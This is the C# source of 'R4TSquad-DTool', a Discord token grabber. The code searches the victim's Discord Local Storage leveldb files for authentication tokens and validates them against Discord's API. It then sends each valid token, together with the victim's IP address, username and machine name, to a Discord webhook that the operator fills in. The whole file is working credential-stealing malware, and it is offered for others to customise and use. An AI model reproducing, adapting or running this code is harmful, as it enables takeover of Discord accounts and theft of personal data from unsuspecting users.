/////////////////////////////////////////
///         R4TSquad-DTool           ///
///     Created By: Mango#3580      ///
//////////////////////////////////////


using System;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;

namespace R4TSquad_DTool
{
    class Program
    {
        public static string WebHook = ""; // Discord WebHook

        public static void SendRequest(string URL, string msg)
        {
            using (DiscordWeb dcWeb = new DiscordWeb())
            {
                dcWeb.WebHook = URL;
                dcWeb.SendMessage(msg);
            }
        }

        static bool CheckToken(string token)
        {
            try
            {
                var http = new WebClient();
                http.Headers.Add("Authorization", token);
                var result = http.DownloadString("https://discordapp.com/api/v6/users/@me");
                if (!result.Contains("Unauthorized"))
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch
            {
                return false;
            }
        }

        static void Main(string[] args)
        {
            Console.Title = "R4TSquad-DTool - Mango#3580";
            Console.WriteLine("Customize this to your liking :)");
            //Readline Fix


            string IP = new WebClient().DownloadString("https://api.ipify.org/"); // IP Checker
            string appdata = Environment.GetEnvironmentVariable("APPDATA");
            string[] directories = Directory.GetDirectories(appdata);

            foreach (var path in directories)
            {
                if (path.Contains("discord"))
                {

                    string[] local = Directory.GetDirectories(path);
                    foreach (var path1 in local)
                    {
                        if (path1.Contains("Local Storage"))
                        {
                            string[] ldb = Directory.GetFiles(path1 + "\\leveldb");

                            foreach (var ldb_file in ldb)
                            {
                                if (ldb_file.EndsWith(".ldb"))
                                {
                                    var text = File.ReadAllText(ldb_file);
                                    string token_reg = @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}";
                                    Match token = Regex.Match(text, token_reg);
                                    if (token.Success)
                                    {
                                        if (CheckToken(token.Value))
                                        SendRequest(WebHook, "```" + Environment.UserName + "'s Information\n" + "IP Address: " + IP + "\n" + "Token: " + token.Value + "\n" + "Machine Name: " + Environment.MachineName + "```");
                                    }
                                }
                            }
                        }
                    }
                }
                Console.ReadLine();
            }
        }
    }
}
